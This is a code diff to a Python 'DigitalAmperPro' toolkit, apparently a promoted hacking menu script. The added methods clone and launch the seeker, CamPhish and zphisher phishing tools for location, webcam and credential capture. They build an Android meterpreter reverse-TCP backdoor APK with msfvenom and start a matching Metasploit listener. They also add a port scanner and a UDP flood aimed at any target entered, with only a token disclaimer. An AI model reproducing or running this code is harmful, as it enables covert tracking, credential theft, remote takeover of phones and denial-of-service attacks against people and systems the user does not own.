@@ -189,7 +189,139 @@ class DigitalAmperPro:
         response = input(f"{Color.YELLOW}{question} {Color.BOLD}(y/N): {Color.RESET}").strip().lower()
         return response == 'y'
 
-    # [Previous tool methods (track_ip, gps_tracker, etc.) remain the same but enhanced...]
+    def track_ip(self) -> None:
+        """Track an IP address using ip-api.com"""
+        self.info("IP Tracker Tool")
+        ip = input("Enter IP address or domain: ").strip()
+        
+        if not ip:
+            self.error("No IP address provided")
+            return
+            
+        try:
+            self.info(f"Tracking IP: {ip}")
+            url = f"http://ip-api.com/json/{ip}"
+            headers = {'User-Agent': self.ua.random}
+            response = requests.get(url, headers=headers, timeout=10)
+            data = response.json()
+            
+            if data.get('status') == 'success':
+                print(f"\n{Color.GREEN}IP Information:{Color.RESET}")
+                print(f"Country: {data.get('country', 'N/A')}")
+                print(f"Region: {data.get('regionName', 'N/A')}")
+                print(f"City: {data.get('city', 'N/A')}")
+                print(f"ZIP: {data.get('zip', 'N/A')}")
+                print(f"ISP: {data.get('isp', 'N/A')}")
+                print(f"Org: {data.get('org', 'N/A')}")
+                print(f"AS: {data.get('as', 'N/A')}")
+                print(f"Latitude: {data.get('lat', 'N/A')}")
+                print(f"Longitude: {data.get('lon', 'N/A')}")
+                print(f"Timezone: {data.get('timezone', 'N/A')}")
+            else:
+                self.error(f"Failed to track IP: {data.get('message', 'Unknown error')}")
+        except requests.exceptions.RequestException as e:
+            self.error(f"Network error: {e}")
+        except json.JSONDecodeError:
+            self.error("Invalid response from server")
+
+    def gps_tracker(self) -> None:
+        """GPS tracking using seeker"""
+        self.info("GPS Tracker Tool")
+        if not self.confirm("This will clone seeker repository. Continue?"):
+            return
+            
+        try:
+            seeker_path = self.tools_dir / "seeker"
+            if not seeker_path.exists():
+                self.info("Cloning seeker repository...")
+                subprocess.run(["git", "clone", "https://github.com/thewhiteh4t/seeker", str(seeker_path)], check=True)
+                
+            self.info("Installing seeker dependencies...")
+            os.chdir(seeker_path)
+            subprocess.run(["bash", "install.sh"], check=True)
+            
+            self.success("Seeker installed successfully")
+            if self.confirm("Start seeker now?"):
+                subprocess.run(["python3", "seeker.py"])
+        except subprocess.CalledProcessError as e:
+            self.error(f"Failed to setup seeker: {e}")
+        except Exception as e:
+            self.error(f"Unexpected error: {e}")
+
+    def camera_hack(self) -> None:
+        """Camera phishing tool"""
+        self.info("Camera Phishing Tool")
+        if not self.confirm("This will clone CamPhish repository. Continue?"):
+            return
+            
+        try:
+            camphish_path = self.tools_dir / "CamPhish"
+            if not camphish_path.exists():
+                self.info("Cloning CamPhish repository...")
+                subprocess.run(["git", "clone", "https://github.com/techchipnet/CamPhish", str(camphish_path)], check=True)
+                
+            self.success("CamPhish installed successfully")
+            if self.confirm("Start CamPhish now?"):
+                os.chdir(camphish_path)
+                subprocess.run(["bash", "camphish.sh"])
+        except subprocess.CalledProcessError as e:
+            self.error(f"Failed to setup CamPhish: {e}")
+        except Exception as e:
+            self.error(f"Unexpected error: {e}")
+
+    def generate_payload(self) -> None:
+        """Generate APK payload using msfvenom"""
+        self.info("Payload Generator Tool")
+        
+        if not self.is_installed("msfvenom"):
+            self.error("msfvenom not found. Please install Metasploit Framework first.")
+            return
+            
+        try:
+            host = input("Enter LHOST (Your IP): ").strip()
+            port = input("Enter LPORT (e.g. 4444): ").strip()
+            output = input("Enter output file name (e.g. hack.apk): ").strip()
+            
+            if not all([host, port, output]):
+                self.error("All fields are required")
+                return
+                
+            self.info("Generating payload...")
+            command = [
+                "msfvenom",
+                "-p", "android/meterpreter/reverse_tcp",
+                f"LHOST={host}",
+                f"LPORT={port}",
+                "-o", output
+            ]
+            
+            subprocess.run(command, check=True)
+            self.success(f"Payload generated: {output}")
+            
+            if self.confirm("Create listener configuration?"):
+                self._create_listener_config(host, port)
+        except subprocess.CalledProcessError as e:
+            self.error(f"Payload generation failed: {e}")
+        except Exception as e:
+            self.error(f"Unexpected error: {e}")
+
+    def _create_listener_config(self, host: str, port: str) -> None:
+        """Create Metasploit listener configuration"""
+        config = f"""use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST {host}
+set LPORT {port}
+exploit
+"""
+        config_path = "listener.rc"
+        try:
+            with open(config_path, 'w') as f:
+                f.write(config)
+            self.success(f"Listener config created: {config_path}")
+            if self.confirm("Start listener now?"):
+                subprocess.run(["msfconsole", "-r", config_path])
+        except IOError as e:
+            self.error(f"Failed to create config: {e}")
 
     def virus_prank(self) -> None:
         """Enhanced Virus Prank with multiple options and animations"""
@@ -442,6 +574,133 @@ class DigitalAmperPro:
         except Exception as e:
             self.error(f"Prank failed: {e}")
 
+    def phishing_tool(self) -> None:
+        """Phishing toolkit"""
+        self.info("Phishing Toolkit")
+        if not self.confirm("This will clone zphisher repository. Continue?"):
+            return
+            
+        try:
+            zphisher_path = self.tools_dir / "zphisher"
+            if not zphisher_path.exists():
+                self.info("Cloning zphisher repository...")
+                subprocess.run(["git", "clone", "https://github.com/htr-tech/zphisher", str(zphisher_path)], check=True)
+                
+            self.success("zphisher installed successfully")
+            if self.confirm("Start zphisher now?"):
+                os.chdir(zphisher_path)
+                subprocess.run(["bash", "zphisher.sh"])
+        except subprocess.CalledProcessError as e:
+            self.error(f"Failed to setup zphisher: {e}")
+        except Exception as e:
+            self.error(f"Unexpected error: {e}")
+
+    def port_scanner(self) -> None:
+        """Simple port scanner"""
+        self.info("Port Scanner Tool")
+        target = input("Enter target IP or domain: ").strip()
+        if not target:
+            self.error("No target specified")
+            return
+            
+        try:
+            # Resolve domain to IP if needed
+            ip = socket.gethostbyname(target)
+            self.info(f"Scanning {target} ({ip})")
+            
+            start_port = int(input("Start port (1-65535): ") or 1)
+            end_port = int(input("End port (1-65535): ") or 1024)
+            
+            if not (1 <= start_port <= 65535) or not (1 <= end_port <= 65535):
+                self.error("Ports must be between 1 and 65535")
+                return
+                
+            if start_port > end_port:
+                start_port, end_port = end_port, start_port
+                
+            timeout = float(input("Timeout in seconds (0.5-5): ") or 1)
+            if not (0.5 <= timeout <= 5):
+                self.error("Timeout must be between 0.5 and 5 seconds")
+                return
+                
+            self.info(f"Scanning ports {start_port}-{end_port}...")
+            open_ports = []
+            
+            for port in range(start_port, end_port + 1):
+                try:
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                        s.settimeout(timeout)
+                        result = s.connect_ex((ip, port))
+                        if result == 0:
+                            open_ports.append(port)
+                            service = socket.getservbyport(port, 'tcp') if port <= 1024 else "unknown"
+                            print(f"{Color.GREEN}Port {port} ({service}) is open{Color.RESET}")
+                except (socket.error, socket.timeout):
+                    continue
+                except KeyboardInterrupt:
+                    self.warning("Scan interrupted by user")
+                    break
+                    
+            if open_ports:
+                self.success(f"Found {len(open_ports)} open ports")
+            else:
+                self.warning("No open ports found")
+        except socket.gaierror:
+            self.error("Could not resolve hostname")
+        except ValueError:
+            self.error("Invalid port number")
+        except Exception as e:
+            self.error(f"Scan failed: {e}")
+
+    def dos_tool(self) -> None:
+        """Simple DoS simulation tool"""
+        self.warning("WARNING: This tool is for educational purposes only")
+        self.warning("Unauthorized testing against networks you don't own is illegal")
+        
+        if not self.confirm("Do you understand and accept responsibility?"):
+            return
+            
+        self.info("DoS Simulation Tool")
+        target = input("Enter target IP or domain: ").strip()
+        if not target:
+            self.error("No target specified")
+            return
+            
+        try:
+            port = int(input("Enter target port (1-65535): ") or 80)
+            if not (1 <= port <= 65535):
+                self.error("Invalid port number")
+                return
+                
+            duration = int(input("Duration in seconds (1-60): ") or 10)
+            if not (1 <= duration <= 60):
+                self.error("Duration must be between 1 and 60 seconds")
+                return
+                
+            self.info(f"Starting DoS simulation against {target}:{port} for {duration} seconds...")
+            
+            # Create a socket and send garbage data
+            start_time = time.time()
+            packets_sent = 0
+            
+            try:
+                while time.time() - start_time < duration:
+                    try:
+                        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+                            s.sendto(os.urandom(1024), (target, port))
+                            packets_sent += 1
+                    except:
+                        continue
+                        
+                self.success(f"Sent {packets_sent} packets in {duration} seconds")
+                print(f"\n{Color.CYAN}Follow for more security tools: {self.instagram_url}{Color.RESET}")
+            except KeyboardInterrupt:
+                self.warning("Attack interrupted by user")
+        except ValueError:
+            self.error("Invalid input")
+        except Exception as e:
+            self.error(f"Attack failed: {e}")
+
     def phone_prank(self) -> None:
         """Enhanced phone prank tool"""
         self.info("📱 ULTIMATE PHONE PRANK TOOL 📱")
@@ -455,6 +714,14 @@ class DigitalAmperPro:
         print(f"{Color.YELLOW}Coming in next version! Stay tuned!{Color.RESET}")
         print(f"{Color.CYAN}Follow {self.instagram_url} for updates{Color.RESET}")
         time.sleep(2)
+
+    def is_installed(self, command: str) -> bool:
+        """Check if a command is available in PATH"""
+        try:
+            subprocess.run([command, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return True
+        except FileNotFoundError:
+            return False
 
     def run(self) -> None:
         """Main application loop with enhanced features"""
